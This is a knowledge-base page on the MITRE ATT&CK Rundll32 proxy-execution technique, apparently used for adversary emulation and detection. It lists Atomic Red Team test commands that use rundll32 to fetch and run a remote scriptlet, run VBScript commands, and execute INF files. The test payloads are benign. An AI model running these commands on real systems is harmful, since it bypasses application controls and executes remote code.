
# Rundll32

## Description

### MITRE Description

> Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Application control', 'Anti-virus']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/011

## Potential Commands

```
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1218.011\src\T1218.011.inf,DefaultInstall_SingleUser,1,
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
```

## Commands Dataset

```
[{'command': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
             '";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'},
 {'command': 'rundll32 vbscript:"\\..\\mshtml,RunHTMLApplication '
             '"+String(CreateObject("WScript.Shell").Run("calc.exe"),0)\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'},
 {'command': 'rundll32.exe advpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'},
 {'command': 'rundll32.exe ieadvpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'},
 {'command': 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction '
             'DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'},
 {'command': 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1218.011/T1218.011.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Rundll32': {'atomic_tests': [{'auto_generated_guid': 'cf3bdb9a-dd11-4b6c-b0d0-9e22b68a71be',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'remote '
                                                                                                      'script '
                                                                                                      'using '
                                                                                                      'rundll32.exe. '
                                                                                                      'Upon '
                                                                                                      'execution '
                                                                                                      'notepad.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'opened.\n',
                                                                                       'executor': {'command': 'rundll32.exe '
                                                                                                               'javascript:"\\..\\mshtml,RunHTMLApplication '
                                                                                                               '";document.write();GetObject("script:#{file_url}").Exec();\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct',
                                                                                                                        'description': 'location '
                                                                                                                                       'of '
                                                                                                                                       'the '
                                                                                                                                       'payload',
                                                                                                                        'type': 'Url'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'execute '
                                                                                               'JavaScript '
                                                                                               'Remote '
                                                                                               'Payload '
                                                                                               'With '
                                                                                               'GetObject',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '638730e7-7aed-43dc-bf8c-8117f805f5bb',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'command '
                                                                                                      'using '
                                                                                                      'rundll32.exe '
                                                                                                      'and '
                                                                                                      'VBscript '
                                                                                                      'in '
                                                                                                      'a '
                                                                                                      'similar '
                                                                                                      'manner '
                                                                                                      'to '
                                                                                                      'the '
                                                                                                      'JavaScript '
                                                                                                      'test.\n'
                                                                                                      'Technique '
                                                                                                      'documented '
                                                                                                      'by '
                                                                                                      'Hexacorn- '
                                                                                                      'http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\n'
                                                                                                      'Upon '
                                                                                                      'execution '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched\n',
                                                                                       'executor': {'command': 'rundll32 '
                                                                                                               'vbscript:"\\..\\mshtml,RunHTMLApplication '
                                                                                                               '"+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'command_to_execute': {'default': 'calc.exe',
                                                                                                                                  'description': 'Command '
                                                                                                                                                 'for '
                                                                                                                                                 'rundll32.exe '
                                                                                                                                                 'to '
                                                                                                                                                 'execute',
                                                                                                                                  'type': 'string'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'execute '
                                                                                               'VBscript '
                                                                                               'command',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': 'd91cae26-7fc1-457b-a854-34c8aad48c89',
                                                                                       'dependencies': [{'description': 'Inf '
                                                                                                                        'file '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{inf_to_execute})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{inf_to_execute}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{inf_to_execute}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{inf_to_execute}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'command '
                                                                                                      'using '
                                                                                                      'rundll32.exe '
                                                                                                      'with '
                                                                                                      'advpack.dll.\n'
                                                                                                      'Reference: '
                                                                                                      'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\n'
                                                                                                      'Upon '
                                                                                                      'execution '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched\n',
                                                                                       'executor': {'command': 'rundll32.exe '
                                                                                                               'advpack.dll,LaunchINFSection '
                                                                                                               '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf',
                                                                                                                              'description': 'Local '
                                                                                                                                             'location '
                                                                                                                                             'of '
                                                                                                                                             'inf '
                                                                                                                                             'file',
                                                                                                                              'type': 'string'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'advpack.dll '
                                                                                               'Execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '5e46a58e-cbf6-45ef-a289-ed7754603df9',
                                                                                       'dependencies': [{'description': 'Inf '
                                                                                                                        'file '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{inf_to_execute})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{inf_to_execute}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{inf_to_execute}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{inf_to_execute}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'command '
                                                                                                      'using '
                                                                                                      'rundll32.exe '
                                                                                                      'with '
                                                                                                      'ieadvpack.dll.\n'
                                                                                                      'Upon '
                                                                                                      'execution '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched\n'
                                                                                                      '\n'
                                                                                                      'Reference: '
                                                                                                      'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n',
                                                                                       'executor': {'command': 'rundll32.exe '
                                                                                                               'ieadvpack.dll,LaunchINFSection '
                                                                                                               '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf',
                                                                                                                              'description': 'Local '
                                                                                                                                             'location '
                                                                                                                                             'of '
                                                                                                                                             'inf '
                                                                                                                                             'file',
                                                                                                                              'type': 'string'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'ieadvpack.dll '
                                                                                               'Execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '41fa324a-3946-401e-bbdd-d7991c628125',
                                                                                       'dependencies': [{'description': 'Inf '
                                                                                                                        'file '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{inf_to_execute})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{inf_to_execute}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{inf_to_execute}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{inf_to_execute}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'command '
                                                                                                      'using '
                                                                                                      'rundll32.exe '
                                                                                                      'with '
                                                                                                      'syssetup.dll. '
                                                                                                      'Upon '
                                                                                                      'execution, '
                                                                                                      'a '
                                                                                                      'window '
                                                                                                      'saying '
                                                                                                      '"installation '
                                                                                                      'failed" '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'opened\n'
                                                                                                      '\n'
                                                                                                      'Reference: '
                                                                                                      'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n',
                                                                                       'executor': {'command': 'rundll32.exe '
                                                                                                               'syssetup.dll,SetupInfObjectInstallAction '
                                                                                                               'DefaultInstall '
                                                                                                               '128 '
                                                                                                               '.\\#{inf_to_execute}\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf',
                                                                                                                              'description': 'Local '
                                                                                                                                             'location '
                                                                                                                                             'of '
                                                                                                                                             'inf '
                                                                                                                                             'file',
                                                                                                                              'type': 'string'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'syssetup.dll '
                                                                                               'Execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '71d771cd-d6b3-4f34-bc76-a63d47a10b19',
                                                                                       'dependencies': [{'description': 'Inf '
                                                                                                                        'file '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{inf_to_execute})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{inf_to_execute}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{inf_to_execute}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{inf_to_execute}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Test '
                                                                                                      'execution '
                                                                                                      'of '
                                                                                                      'a '
                                                                                                      'command '
                                                                                                      'using '
                                                                                                      'rundll32.exe '
                                                                                                      'with '
                                                                                                      'setupapi.dll. '
                                                                                                      'Upon '
                                                                                                      'execution, '
                                                                                                      'a '
                                                                                                      'windows '
                                                                                                      'saying '
                                                                                                      '"installation '
                                                                                                      'failed" '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'opened\n'
                                                                                                      '\n'
                                                                                                      'Reference: '
                                                                                                      'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n',
                                                                                       'executor': {'command': 'rundll32.exe '
                                                                                                               'setupapi.dll,InstallHinfSection '
                                                                                                               'DefaultInstall '
                                                                                                               '128 '
                                                                                                               '.\\#{inf_to_execute}\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf',
                                                                                                                              'description': 'Local '
                                                                                                                                             'location '
                                                                                                                                             'of '
                                                                                                                                             'inf '
                                                                                                                                             'file',
                                                                                                                              'type': 'string'}},
                                                                                       'name': 'Rundll32 '
                                                                                               'setupapi.dll '
                                                                                               'Execution',
                                                                                       'supported_platforms': ['windows']}],
                                                                     'attack_technique': 'T1218.011',
                                                                     'display_name': 'Signed '
                                                                                     'Binary '
                                                                                     'Proxy '
                                                                                     'Execution: '
                                                                                     'Rundll32'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Exploit Protection](../mitigations/Exploit-Protection.md)


# Actors


* [CopyKittens](../actors/CopyKittens.md)

* [APT19](../actors/APT19.md)
    
* [APT28](../actors/APT28.md)
    
* [APT3](../actors/APT3.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [APT29](../actors/APT29.md)
    
* [TA505](../actors/TA505.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
* [APT32](../actors/APT32.md)
    
